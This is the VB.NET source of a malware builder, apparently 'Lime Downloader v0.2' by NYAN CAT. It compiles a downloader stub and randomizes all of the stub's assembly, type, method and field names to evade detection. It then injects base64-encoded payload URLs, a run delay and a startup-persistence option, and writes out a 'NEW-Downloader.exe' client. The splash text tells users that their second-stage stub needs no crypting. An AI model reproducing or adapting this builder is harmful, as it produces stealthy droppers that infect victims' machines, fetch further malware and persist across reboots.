Imports Mono.Cecil
Imports Mono.Cecil.Cil

Public Class MainForm
    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        Try
            Dim URL As String = ""
            For i As Integer = 0 To RichTextBox1.Lines.Length - 1
                URL += Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(RichTextBox1.Lines(i))) + "#,#"
            Next

            If IO.File.Exists("C:\Windows\Microsoft.NET\Framework\v4.0.30319\ilasm.exe") Then
                Shell("C:\Windows\Microsoft.NET\Framework\v4.0.30319\ilasm.exe """ & Application.StartupPath + "\Payload\Payload.il""" & " /out=""" & Application.StartupPath + "\Payload\Payload.exe""" & "", AppWinStyle.Hide, False, -1)
                Threading.Thread.Sleep(3000)
            Else
                MsgBox("Framework 4.0 is not installed!", MsgBoxStyle.Critical)
                Exit Sub
            End If

            Dim definition As AssemblyDefinition = AssemblyDefinition.ReadAssembly(Application.StartupPath & "\Payload\Payload.exe")
            definition.Name = New AssemblyNameDefinition(Randomi(rand.Next(3, 5)) + " " + Randomi(rand.Next(3, 5)), New Version(rand.Next(0, 10), rand.Next(0, 10), rand.Next(0, 10), rand.Next(0, 10)))
            Dim definition2 As ModuleDefinition
            For Each definition2 In definition.Modules
                definition2.Name = Randomi(rand.Next(3, 10))
                Dim definition3 As TypeDefinition
                For Each definition3 In definition2.Types
                    definition3.Namespace = Randomi(rand.Next(3, 10))
                    definition3.Name = Randomi(rand.Next(3, 10))
                    For Each F In definition3.Fields
                        F.Name = Randomi(rand.Next(3, 10))
                    Next
                    Dim definition4 As MethodDefinition
                    For Each definition4 In definition3.Methods
                        If Not definition4.IsConstructor AndAlso Not definition4.IsRuntimeSpecialName Then
                            definition4.Name = Randomi(rand.Next(3, 10))
                            For Each P As ParameterDefinition In definition4.Parameters
                                P.Name = Randomi(rand.Next(3, 10))
                            Next
                        ElseIf (definition4.IsConstructor AndAlso definition4.HasBody) Then
                            Dim enumerator As IEnumerator(Of Instruction)
                            Try
                                enumerator = definition4.Body.Instructions.GetEnumerator
                                Do While enumerator.MoveNext
                                    Dim current As Instruction = enumerator.Current
                                    If ((current.OpCode.Code = Code.Ldstr) And (Not current.Operand Is Nothing)) Then
                                        Dim str As String = current.Operand.ToString

                                        If (str = "%Delay%") Then
                                            current.Operand = NumericUpDown1.Value.ToString
                                        End If

                                        If (str = "%URL%") Then
                                            current.Operand = URL.ToString
                                        End If

                                        If (str = "%Startup%") Then
                                            current.Operand = CheckBox1.Checked.ToString
                                        End If

                                    End If
                                Loop
                            Finally
                            End Try

                        End If
                    Next
                Next
            Next

            definition.Write(Application.StartupPath + "\" + "NEW-Downloader.exe")
            MsgBox("Your Client Has been Created Successfully", vbInformation, "DONE!")
            My.Settings.Save()
            definition.Dispose()
            Try : IO.File.Delete(Application.StartupPath & "\Payload\Payload.exe") : Catch : End Try
        Catch ex1 As Exception
            MsgBox(ex1.Message, MsgBoxStyle.Exclamation)
            Return
        End Try
    End Sub

    Private Sub MainForm_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        MsgBox("Lime Downloader v0.2 By NYAN CAT" + Environment.NewLine + "https://github.com/NYAN-x-CAT" + Environment.NewLine + Environment.NewLine + "[1] This downloader works only with .NET files" + Environment.NewLine + "[2] You don't need to crypt your stub, Just upload your stub without any installation or modification")
    End Sub
End Class
